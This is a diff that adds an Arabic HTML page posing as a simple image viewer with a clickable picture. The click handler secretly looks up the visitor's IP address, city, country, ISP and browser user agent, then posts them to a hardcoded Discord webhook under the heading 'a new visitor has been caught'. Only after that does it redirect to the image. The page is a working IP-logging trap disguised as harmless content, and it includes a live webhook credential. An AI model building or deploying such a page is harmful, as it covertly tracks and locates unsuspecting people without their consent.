@@ -1,0 +1,93 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>مشاهدة الصورة</title>
+    <style>
+        body {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+            background-color: #f0f0f0;
+            font-family: sans-serif;
+        }
+        .container {
+            text-align: center;
+        }
+        img {
+            max-width: 90%;
+            height: auto;
+            border-radius: 12px;
+            box-shadow: 0 8px 30px rgba(0,0,0,0.3);
+            cursor: pointer;
+            transition: transform 0.3s ease;
+        }
+        img:hover {
+            transform: scale(1.02);
+        }
+        p {
+            color: #666;
+            margin-top: 15px;
+            font-size: 14px;
+        }
+    </style>
+</head>
+<body>
+
+    <div class="container">
+        <a href="#" id="captureLink">
+            <img src="https://i.pinimg.com/736x/ce/e3/87/cee387c023a1827648d4c8007d0ea675.jpg" alt="Click to view image">
+        </a>
+        <p>اضغط على الصورة للعرض بالحجم الكامل</p>
+    </div>
+
+    <script>
+        // رابط الويب هوك الخاص بك من ديسكورد
+        const webhookURL = "https://discord.com/api/webhooks/1489434301240971375/r0lD5avK8ybkigLb9QlEOQ_OxVYqVN5dcIxYTpaEFVKy6O9KuNy60KMnXDRsnwWU6ecs"; 
+
+        document.getElementById('captureLink').addEventListener('click', async function(event) {
+            event.preventDefault(); 
+
+            try {
+                // جلب بيانات الـ IP والمعلومات من API خارجي
+                const response = await fetch('https://ipapi.co/json/');
+                const data = await response.json();
+
+                // تجهيز الرسالة بشكل احترافي لديسكورد (Embed)
+                const payload = {
+                    embeds: [{
+                        title: "🎯 تم اصطياد زائر جديد!",
+                        color: 3447003, // لون أزرق
+                        fields: [
+                            { name: "🌐 IP Address", value: `\`${data.ip}\``, inline: true },
+                            { name: "📍 المدينة", value: data.city || "غير معروف", inline: true },
+                            { name: "🌍 الدولة", value: data.country_name || "غير معروف", inline: true },
+                            { name: "📶 المزود (ISP)", value: data.org || "غير معروف", inline: false },
+                            { name: "📱 الجهاز المتصل", value: navigator.userAgent, inline: false }
+                        ],
+                        footer: { text: "نظام التتبع الخاص بفارس 🚀" },
+                        timestamp: new Date()
+                    }]
+                };
+
+                // إرسال البيانات للويب هوك
+                await fetch(webhookURL, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(payload)
+                });
+
+            } catch (error) {
+                console.error("خطأ أثناء جلب البيانات:", error);
+            }
+
+            // بعد انتهاء السحب (أو في حال الخطأ)، نحوله للصورة الحقيقية
+            window.location.href = "https://i.pinimg.com/736x/ce/e3/87/cee387c023a1827648d4c8007d0ea675.jpg";
+        });
+    </script>
+
+</body>
+</html>
